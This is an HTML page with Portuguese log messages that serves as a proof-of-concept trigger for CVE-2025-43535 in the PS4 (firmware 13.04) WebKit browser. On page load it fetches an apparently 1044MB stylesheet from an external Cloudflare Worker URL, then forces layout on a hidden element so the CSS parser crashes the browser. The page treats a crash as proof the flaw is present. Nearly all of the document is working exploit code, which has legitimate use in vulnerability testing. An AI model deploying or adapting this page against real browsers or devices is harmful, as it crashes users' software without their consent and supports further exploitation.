<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>CVE-2025-43535</title>
<style>
  body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; margin:0; font-size:13px; }
  #log { background:#111; border:1px solid #2a4a2a; padding:10px; height:72vh; overflow-y:auto; font-size:11px; line-height:1.7; }
  .ok    { color:#00ff88 }
  .fail  { color:#ff4444 }
  .info  { color:#ffcc44 }
  .warn  { color:#ff8844 }
  .crash { color:#ff44ff; font-weight:bold }
  .dim   { color:#336633 }
  .bar   { background:#0a1a0a; border:1px solid #1a3a1a; color:#44aa44; padding:6px 10px; margin-bottom:8px; font-size:11px; }
</style>
</head>
<body>
<div style="color:#aaffaa;font-size:12px;margin-bottom:6px">
  CVE-2025-43535 · Cloudflare Worker · 1044MB · PS4 FW 13.04
</div>
<div class="bar" id="bar">Aguardando...</div>
<div id="log"></div>
<div id="stage" style="position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;overflow:hidden"></div>

<script>
"use strict";

var WORKER_URL = 'https://white-flower-ef79.ldsouza1986.workers.dev/payload.css';
var logEl = document.getElementById('log');
var barEl = document.getElementById('bar');
var stage = document.getElementById('stage');

function L(m, c) {
  logEl.innerHTML += '<div class="' + (c || 'dim') + '">' + m + '</div>';
  logEl.scrollTop = logEl.scrollHeight;
}
function bar(m) { barEl.textContent = m; }

function run() {
  // A CHAVE EXTRA FOI REMOVIDA DAQUI
  
  L('CVE-2025-43535 · via Cloudflare Worker', 'info');
  L('Worker: ' + WORKER_URL, 'dim');
  L('', '');
  L('[1/3] Carregando 1044MB do Worker...', 'warn');
  bar('[1/3] Carregando CSS do Worker...');

  var el = document.createElement('div');
  el.className = 'trigger-element'; // Use uma classe que o CSS do Worker possa afetar
  el.style.cssText = 'position:absolute;visibility:hidden';
  stage.appendChild(el);

  var link = document.createElement('link');
  link.rel  = 'stylesheet';
  link.href = WORKER_URL;

  link.onload = function() {
    L('[1/3] 1044MB carregados ✓', 'ok');
    bar('[2/3] Forçando layout...');
    L('[2/3] offsetWidth — CSS parser resolve 1044MB...', 'warn');
    L('[2/3] SE O BROWSER FECHAR: CRASH = CVE PRESENTE', 'crash');

    // Timeout ligeiramente maior para garantir que o parser terminou a recepção
    setTimeout(function() {
      try {
        // Força o motor WebKit a calcular o layout com o CSS gigante
        var trigger = el.offsetWidth; 
        var w = window.getComputedStyle(el).width;
        L('[2/3] width="' + w + '" (Valor lido: ' + trigger + ')', 'ok');
      } catch(e) { 
        L('[2/3] Erro no trigger: ' + e, 'fail'); 
      }

      L('', '');
      L('CRASH = CVE-2025-43535 PRESENTE', 'crash');
      L('SEM CRASH = PATCHED', 'ok');
      bar('DONE');
    }, 250);
  };

  link.onerror = function() {
    L('Erro ao carregar Worker URL.', 'fail');
    L('Verificar: Worker deployado? URL correta? CORS (Access-Control-Allow-Origin: *)?', 'warn');
    bar('ERRO');
  };

  document.head.appendChild(link);
}

window.addEventListener('load', function() { 
    setTimeout(run, 1000); // Aguarda o browser estabilizar antes do teste
});
</script>
</body>
</html>
